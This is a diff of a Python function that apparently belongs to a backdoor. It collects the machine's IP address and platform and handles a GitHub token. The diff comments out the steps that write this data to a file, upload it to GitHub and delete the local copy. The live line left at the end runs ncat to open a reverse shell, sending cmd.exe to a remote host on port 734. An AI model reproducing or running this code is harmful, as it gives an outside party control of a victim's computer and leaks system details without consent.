@@ -83,10 +83,10 @@ def run(token):
         print('TokenData: ', token)
         stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()
         print("text stmnt: "+ stmnt)
-        create_file(fname,stmnt)
+        #create_file(fname,stmnt)
         #subir_archivo('data.txt', stmnt )
-        update_file_on_github(fname,token)
-        delete_file("data.txt")
+        #update_file_on_github(fname,token)
+        #delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
